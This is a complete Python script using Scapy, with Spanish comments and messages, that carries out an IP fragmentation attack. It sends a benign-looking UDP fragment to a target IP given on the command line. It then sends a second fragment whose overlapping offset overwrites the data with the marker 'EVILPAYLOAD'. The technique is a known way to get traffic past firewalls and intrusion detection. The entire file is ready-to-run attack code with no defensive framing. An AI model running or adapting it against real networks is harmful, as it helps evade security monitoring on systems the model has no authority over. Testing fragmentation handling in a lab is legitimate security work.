#!/usr/bin/env python3
"""Ataque de fragmentación IP con offsets solapados (EVILPAYLOAD en UDP)."""
import sys
from scapy.all import IP, UDP, send

EVIL = b"EVILPAYLOAD"


def attack(dst: str) -> None:
    ip_id = 0xBEEF
    sport, dport = 1337, 9999

    benign = b"SAFE____" + b"XXXXXXXX"
    frag0 = IP(dst=dst, id=ip_id, flags="MF", frag=0) / UDP(sport=sport, dport=dport) / benign
    send(frag0, verbose=False)
    print(f"[+] Fragmento 0 enviado ({len(benign)} bytes payload UDP benigno)")

    overlap = EVIL + b"!!!!!!!"
    frag1 = IP(dst=dst, id=ip_id, flags=0, frag=1) / overlap
    send(frag1, verbose=False)
    print(f"[+] Fragmento 1 solapado (offset 8) con {EVIL.decode()}")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Uso: python3 fragment_attack.py <IP_Objetivo>")
        sys.exit(1)
    attack(sys.argv[1])
